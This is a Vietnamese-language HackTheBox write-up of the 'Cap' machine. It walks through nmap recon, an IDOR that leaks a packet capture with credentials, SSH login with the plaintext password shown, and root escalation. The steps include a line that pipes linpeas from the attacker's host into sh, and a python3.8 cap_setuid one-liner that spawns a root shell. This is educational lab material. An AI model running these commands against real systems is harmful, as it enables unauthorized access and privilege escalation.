---
layout: single
title: "Cap"
date: 2026-03-01 17:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, Linux , Machine ,Hackthebox]
---
# Cap - Easy - Linux
## User Flag
Recon :
```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.5.129 -sV -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 22:43 +07
Nmap scan report for 10.129.5.129
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Phát hiện web service có bug IDOR ở `http://10.129.7.91/data/{id}`. Tìm và download được file pcab chứa thông tin user,password ftp ở `http://10.129.7.91/data/0`.

Thử credential đó,phát hiện có thể dùng để ssh được:
```bash
nathan:Buck3tH4TF0RM3!
# ssh và lấy user flag
taneora@DUNGNHV-LAPTOP:~$ ssh nathan@10.129.7.91
nathan@10.129.7.91's password: Buck3tH4TF0RM3!

nathan@cap:~$ cat user.txt
<user flag>
```
## Root flag
Kéo `linpeas` vào để enum:
```bash
taneora@DUNGNHV-LAPTOP:~$ python3 -m http.server 80 # Host
nathan@cap:~$ curl  10.10.15.208/linpeas.sh | sh #victim
```
Linpeas phát hiện `/usr/bin/python3.8` có capabilitie `cap_setuid`:
```bash
Processes with capability sets (non-zero CapEff/CapAmb, limit 40)

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
Hoặc có thể enum bằng tay:
```bash
nathan@cap:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
Exploit:
```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# cat /root/root.txt
<root flag>
```
